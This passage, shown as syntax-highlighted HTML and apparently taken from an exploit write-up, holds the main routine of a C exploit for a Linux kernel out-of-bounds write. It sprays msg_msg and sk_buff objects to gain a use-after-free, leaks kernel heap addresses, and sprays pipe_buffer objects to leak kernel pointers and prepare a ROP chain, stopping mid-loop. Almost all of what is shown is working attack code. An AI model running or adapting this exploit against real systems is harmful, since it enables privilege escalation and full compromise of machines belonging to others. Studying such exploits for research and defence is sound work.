    <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> kheap <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> msg_fake_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> pipe_buffer_ops <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> kernel_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> kernel_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
    <span class="token keyword">int</span> ridx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> <span class="token operator">*</span>rop<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setup_sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socketpair"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Setup message queues"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msqid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying primary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg_primary<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_primary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_primary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_primary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_primary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_primary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_PRIMARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying secondary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_SECONDARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]  Creating holes in primary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> HOLE_STEP<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i <span class="token operator">+=</span> HOLE_STEP<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_primary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_primary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_PRIMARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Trigger oob write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trigger_oob_write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Searching for corrupted primary message..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>i <span class="token operator">%</span> HOLE_STEP<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peek_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] MSG_TAG error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            real_id <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            fake_id <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>real_id <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> fake_id <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Could not corrupt any primary message\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] real_id = %#x, fake_id = %#x\n"</span><span class="token punctuation">,</span> real_id<span class="token punctuation">,</span> fake_id<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Free secondary message and then gain UAF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>real_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_SECONDARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying fake secondary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0x41414141</span><span class="token punctuation">,</span> <span class="token number">0x42424242</span><span class="token punctuation">,</span> PAGE_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking adjacent secondary message..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peek_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>fake_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_fake<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Could not leak adjacent secondary message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    kheap <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_next<span class="token punctuation">;</span> <span class="token comment">// kheap pointer to the primary message</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>kheap <span class="token operator">&amp;</span> <span class="token punctuation">(</span>PRIMARY_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        kheap <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_prev<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kheap = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> kheap<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Freeing skb..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">free_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying fake secondary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0x41414141</span><span class="token punctuation">,</span> <span class="token number">0x42424242</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">)</span><span class="token punctuation">,</span> kheap <span class="token operator">-</span> MSG_MSGSEG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking address of msg_fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peek_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>fake_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_fake<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>PAGE_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Could not leak address of msg_fake\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>PAGE_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    msg_fake_addr <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_next<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg_fake_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span>SECONDARY_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        msg_fake_addr <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_prev<span class="token punctuation">;</span>
    msg_fake_addr <span class="token operator">-=</span> SECONDARY_SIZE<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] address of msg_fake = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> msg_fake_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Free secondary message and then gain UAF controlled by skb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">free_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">,</span> msg_fake_addr<span class="token punctuation">,</span> msg_fake_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>fake_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_fake<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_FAKE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying pipe_buffer objects..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] pipe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"xi4oyu"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking and freeing pipe_buffer object..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MTYPE_FAKE<span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
